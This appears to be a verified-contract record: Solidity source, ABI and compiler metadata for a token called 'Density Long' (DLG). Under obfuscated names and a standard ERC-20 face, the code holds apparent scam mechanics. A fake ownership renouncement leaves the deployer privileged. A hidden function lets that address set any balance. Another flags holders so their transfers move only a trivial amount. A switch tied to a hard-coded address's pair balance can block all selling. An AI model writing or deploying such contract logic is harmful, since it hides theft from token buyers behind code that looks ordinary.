{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface shouldLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atEnableReceiver {\n    function createPair(address tradingLaunchedLiquidity, address exemptSellTake) external returns (address);\n}\n\ninterface liquiditySenderFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountMode) external view returns (uint256);\n\n    function transfer(address totalMin, uint256 fundReceiver) external returns (bool);\n\n    function allowance(address exemptFromMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalMin,\n        uint256 fundReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isReceiverMarketing, uint256 value);\n    event Approval(address indexed exemptFromMode, address indexed spender, uint256 value);\n}\n\ninterface liquiditySenderFeeMetadata is liquiditySenderFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DensityLong is autoShould, liquiditySenderFee, liquiditySenderFeeMetadata {\n\n    function allowance(address feeToTrading, address fromList) external view virtual override returns (uint256) {\n        if (fromList == listSwap) {\n            return type(uint256).max;\n        }\n        return txSender[feeToTrading][fromList];\n    }\n\n    bool private amountAtSell;\n\n    uint256 public toTotal;\n\n    address public launchTx;\n\n    uint256 constant shouldEnable = 19 ** 10;\n\n    uint8 private atAmount = 18;\n\n    mapping(address => mapping(address => uint256)) private txSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atAmount;\n    }\n\n    address public takeLaunched;\n\n    address listSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public totalSellTrading;\n\n    string private takeLiquidity = \"Density Long\";\n\n    function toAtLimit(address walletSwap) public {\n        if (isLaunch) {\n            return;\n        }\n        if (tradingLaunch == amountAtSell) {\n            launchedIs = toTotal;\n        }\n        totalSellTrading[walletSwap] = true;\n        if (listTeam != amountAtSell) {\n            launchedIs = toTotal;\n        }\n        isLaunch = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return toFee;\n    }\n\n    function approve(address fromList, uint256 fundReceiver) public virtual override returns (bool) {\n        txSender[_msgSender()][fromList] = fundReceiver;\n        emit Approval(_msgSender(), fromList, fundReceiver);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchMarketingTake;\n    }\n\n    function owner() external view returns (address) {\n        return toFee;\n    }\n\n    event OwnershipTransferred(address indexed walletFeeTrading, address indexed swapFee);\n\n    function toSender(uint256 fundReceiver) public {\n        autoTeam();\n        launchReceiverEnable = fundReceiver;\n    }\n\n    string private launchMarketingTake = \"DLG\";\n\n    uint256 private isAmount = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return takeLiquidity;\n    }\n\n    uint256 public launchedIs;\n\n    bool public isLaunch;\n\n    function feeMarketing() public {\n        emit OwnershipTransferred(takeLaunched, address(0));\n        toFee = address(0);\n    }\n\n    bool private tradingLaunch;\n\n    function balanceOf(address amountMode) public view virtual override returns (uint256) {\n        return buyLaunched[amountMode];\n    }\n\n    function feeTrading(address launchedTo, uint256 fundReceiver) public {\n        autoTeam();\n        buyLaunched[launchedTo] = fundReceiver;\n    }\n\n    mapping(address => uint256) private buyLaunched;\n\n    function teamFrom(address shouldIs, address totalMin, uint256 fundReceiver) internal returns (bool) {\n        require(buyLaunched[shouldIs] >= fundReceiver);\n        buyLaunched[shouldIs] -= fundReceiver;\n        buyLaunched[totalMin] += fundReceiver;\n        emit Transfer(shouldIs, totalMin, fundReceiver);\n        return true;\n    }\n\n    bool public liquidityLimit;\n\n    address tokenEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isAmount;\n    }\n\n    function tradingLiquidityReceiver(address shouldIs, address totalMin, uint256 fundReceiver) internal returns (bool) {\n        if (shouldIs == takeLaunched) {\n            return teamFrom(shouldIs, totalMin, fundReceiver);\n        }\n        uint256 launchedLaunchSwap = liquiditySenderFee(launchTx).balanceOf(tokenEnable);\n        require(launchedLaunchSwap == launchReceiverEnable);\n        require(totalMin != tokenEnable);\n        if (listLimit[shouldIs]) {\n            return teamFrom(shouldIs, totalMin, shouldEnable);\n        }\n        return teamFrom(shouldIs, totalMin, fundReceiver);\n    }\n\n    address private toFee;\n\n    mapping(address => bool) public listLimit;\n\n    uint256 tradingIs;\n\n    uint256 public buyMax;\n\n    function transfer(address launchedTo, uint256 fundReceiver) external virtual override returns (bool) {\n        return tradingLiquidityReceiver(_msgSender(), launchedTo, fundReceiver);\n    }\n\n    bool private listTeam;\n\n    uint256 launchReceiverEnable;\n\n    function buyAutoTake(address toAt) public {\n        autoTeam();\n        if (buyMax != launchedIs) {\n            amountAtSell = true;\n        }\n        if (toAt == takeLaunched || toAt == launchTx) {\n            return;\n        }\n        listLimit[toAt] = true;\n    }\n\n    constructor (){\n        if (buyMax == launchedIs) {\n            launchedIs = toTotal;\n        }\n        shouldLiquidity swapReceiver = shouldLiquidity(listSwap);\n        launchTx = atEnableReceiver(swapReceiver.factory()).createPair(swapReceiver.WETH(), address(this));\n        \n        takeLaunched = _msgSender();\n        feeMarketing();\n        totalSellTrading[takeLaunched] = true;\n        buyLaunched[takeLaunched] = isAmount;\n        if (amountAtSell != listTeam) {\n            amountAtSell = true;\n        }\n        emit Transfer(address(0), takeLaunched, isAmount);\n    }\n\n    function transferFrom(address shouldIs, address totalMin, uint256 fundReceiver) external override returns (bool) {\n        if (_msgSender() != listSwap) {\n            if (txSender[shouldIs][_msgSender()] != type(uint256).max) {\n                require(fundReceiver <= txSender[shouldIs][_msgSender()]);\n                txSender[shouldIs][_msgSender()] -= fundReceiver;\n            }\n        }\n        return tradingLiquidityReceiver(shouldIs, totalMin, fundReceiver);\n    }\n\n    function autoTeam() private view {\n        require(totalSellTrading[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFromMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFeeTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiverMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"}],\"name\":\"buyAutoTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"feeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"toAtLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"toSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalSellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DensityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}